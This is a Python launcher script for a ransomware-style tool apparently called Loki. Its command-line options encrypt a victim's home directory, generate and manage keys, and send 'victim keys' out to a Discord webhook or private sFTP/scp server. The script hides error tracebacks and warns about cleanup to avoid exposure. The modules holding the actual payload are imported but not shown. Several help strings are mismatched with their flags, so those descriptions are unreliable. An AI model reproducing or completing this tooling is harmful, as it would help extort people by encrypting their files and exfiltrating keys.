# Imports.
import sys # System stuff.
import os # Operating System functions.
from colorama import Fore # For text colour.
import argparse # For adding arguments.
from pathlib import Path
from cryptography.fernet import Fernet

# Modules.
import src.modules.discovery as discovery
import src.modules.encrypt as encrypt
import src.modules.decrypt as decrypt
import src.modules.keygen as keygen
import src.modules.dhook as hook
import etc.init.banner as banner
import src.main as main

# Pre-run.
os.system("clear")

# Hide tracebacks - change to 1 for dev mode.
sys.tracebacklimit = 0

# Config (Prints).
print_text = (f"{Fore.WHITE}") # Change the colour of text output in the client side prints.
print_dividers = (f"{Fore.LIGHTRED_EX}") # Changes the [], | and : in the client side prints.
print_success = (f"{Fore.WHITE}[{Fore.GREEN}SUCCESS{Fore.WHITE}]") # Success output.
print_successfully = (f"{Fore.WHITE}[{Fore.GREEN}SUCCESSFULLY{Fore.WHITE}]") # Successfully output.
print_failed = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}FAILED{Fore.WHITE}]") # Failed output.
print_prompt = (f"{Fore.WHITE}[{Fore.YELLOW}»{Fore.WHITE}]") # Prompt output.
print_notice = (f"{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}]") # Notice output.
print_question =  (f"{Fore.WHITE}[{Fore.YELLOW}?{Fore.WHITE}]") # Alert output.
print_alert =  (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}!{Fore.WHITE}]") # Alert output.
print_exited = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}EXITED{Fore.WHITE}]") # Execited output.
print_disconnected = (f"{Fore.WHITE}[{Fore.LIGHTRED_EX}DISCONNECTED{Fore.WHITE}]") # Disconnected output.
print_command = (f"\n[{Fore.YELLOW}>_{Fore.WHITE}]: ") # Always asks for a command on a new line.

# Arg parser.
parser = argparse.ArgumentParser()
ap = parser.add_mutually_exclusive_group()
ap.add_argument('-discovery', help='Call on Loki to encrypt the home directory and pull the encryption key.\n', action="store_true")
ap.add_argument('-encrypt', help='Detect read/writes on prime target infrastructure files.', action="store_true")
ap.add_argument('-decrypt', help='Scan a given IP ports for potential vulns.', action="store_true")
ap.add_argument('-keygen', help='Keep this key secure, if you lose it, you cannot unencrypt files!', action="store_true")
ap.add_argument('-hook', help='Offload victim keys to a discord webhook or private sFTP/scp connection.', action="store_true")
args = vars(parser.parse_args())

# Args.
if args['discovery']: # Runs the discovery program.
    while True:
        try:
                discovery.discovery() # --
                os._exit(0) # Attempts to exit.
        except:
            print(f"{print_prompt} {print_failed}: Discovery failed to run here!\n")
            print(f"[!] Manual cleanup may be necessary now to avoid exposure.")
            os._exit(0) # Attempts to exit.

if args['encrypt']: # Runs the encrypt program.
    while True:
        try:
            encrypt.encrypt() # --
            os._exit(0) # Attempts to exit.
        except:
            print(f"{print_prompt} {print_failed}: Encrypt failed to run here!\n")
            os._exit(0) # Attempts to exit.

if args['decrypt']: # Runs the decrypt program.
    while True:
        try:
            decrypt.decrypt() # --
            os._exit(0) # Attempts to exit.
        except:
            print(f"{print_prompt} {print_failed}: Decrypt failed to run here!\n")
            os._exit(0) # Attempts to exit.

if args['keygen']: # Runs the keygen program.
    while True:
        try:
            keygen.keygen() # --
            os._exit(0) # Attempts to exit.
        except:
            print(f"{print_prompt} {print_failed}: Keygen failed to run here!\n")
            os._exit(0) # Attempts to exit.

if args['hook']: # Runs the keygen program.
    while True:
        try:
            hook.hook() # --
            os._exit(0) # Attempts to exit.
        except:
            print(f"{print_prompt} {print_failed}: Hook failed to run here!\n")
            os._exit(0) # Attempts to exit.

# Program.
if __name__ == '__main__':
    try:
        banner.banner() # Shows the banner.
        main.main_script() # Runs the primary program.
    except KeyboardInterrupt:
        print("\n") # Gaps the print.
        print(f"{print_exited} {print_notice} {print_successfully}") # States the script ended.
        print("\n") # Gaps the print.
        print(f'{print_notice} You interrupted the program.') # States it was interrupted.
        print("\n") # Gaps the print.
        try:
            sys.exit(0) # Attempts to exit.
        except SystemExit:
            os._exit(0) # Attempts to exit.